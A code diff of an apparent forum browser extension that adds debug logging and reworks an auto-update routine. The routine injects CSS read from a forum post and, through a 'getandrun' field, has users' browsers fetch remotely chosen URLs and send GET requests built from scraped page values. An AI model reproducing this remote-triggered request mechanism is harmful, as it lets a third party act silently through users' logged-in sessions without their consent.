@@ -202,19 +202,14 @@ if (prefs['header.widgets'] === true) {
     
 // Editor Toolbar
     // --Add emoji button
+	console.log('cat');
     $("body #editor #format_controls .format-text").append("<li><a class='bg_addemoji' onclick='var el = document.getElementById(\"emoticons\"); el.style.display = (el.style.display != \"block\" ? \"block\" : \"\" ); var el2 = document.getElementById(\"emote_select\"); el2.style.display = (el2.style.display != \"block\" ? \"block\" : \"\" );' title='Add Emoticons'>Add Emoticons</a></li>");
-
+console.log('dog');
     // --Add spoiler button
     $("body #editor #format_controls .format-elements").append("<li><a class='bg_spoiler' onclick='function wrapText(elementID, openTag, closeTag) {var textarea = document.getElementById(elementID); var len = textarea.value.length; var start = textarea.selectionStart; var end = textarea.selectionEnd; var selectedText = textarea.value.substring(start, end); var replacement = openTag + selectedText + closeTag; textarea.value = textarea.value.substring(0, start) + replacement + textarea.value.substring(end, len);} wrapText(\"message\", \"[spoiler]\", \"[/spoiler]\");' title='Add Spoiler - [spoiler][/spoiler]'>Add Spoiler Tag</a></li>");
     
 // Shortcuts
 if (prefs['header.shortcuts'] === true) {
-    // check if local prefs exist
-    if (typeof(prefs['header.shortcuts.list']) == 'object' && $.isEmptyObject(prefs['header.shortcuts.list'])) {
-        prefs['header.shortcuts.list'] = prefs['header.shortcuts.list'];
-        console.warn('Your shortcuts are currently saved locally.');
-    }
-
     // check if empty
     if (!$.isEmptyObject(prefs['header.shortcuts.list'])) {
         $('#gaia_header .userName').prepend('<ul id="bg_shortcuts"><a>Shortcuts</a><div></div></ul>');
@@ -339,23 +334,27 @@ if (prefs['instantUpdating'] === true) {
             headers: {'X-PJAX': true}
         })
         .done(function(html) {
-            if ($('.postcontent:eq(1) .postbody span[style="color:uptoversion"]', html).length == 1)
-                var version = parseInt(prefs['version'].replace(/\./g,''), 10);
+            if ($('.postcontent:eq(1) .postbody span[style="color:enabled"]', html).length == 1) {
+                var version = prefs['version'].replace(/\./g,'');
                 html = $('.postcontent:eq(1) .postbody', html);
-
+console.log('=====================inside=====================');
                 // look for new code
-                if (version <= parseInt($('span[style="color:uptoversion"]', html).text().replace(/\./g,''))) {
-                    if ($('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).length == 1) {
-                        self.port.emit('set', ['css', $('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).text()]);
-                    }
-                    else self.port.emit('remove', 'css');
+                if ($('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).length == 1) {
+                    self.port.emit('set', ['css', $('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).text()]);
+					console.log('=====================yes=====================');
                 }
+                else {
+					self.port.emit('remove', 'css');
+					console.log('=====================no=====================');
+				}
+
                 if ($('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).length == 1) {
                     var data = $('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).text().split(',');
                     $.ajax({url: data[0], cache: false, dataType: 'html', headers: {'X-PJAX': true}}).done(function(html) {
-                    if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
-                });
-            }
+						if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
+					});
+				}
+			}
         });
     });
 }
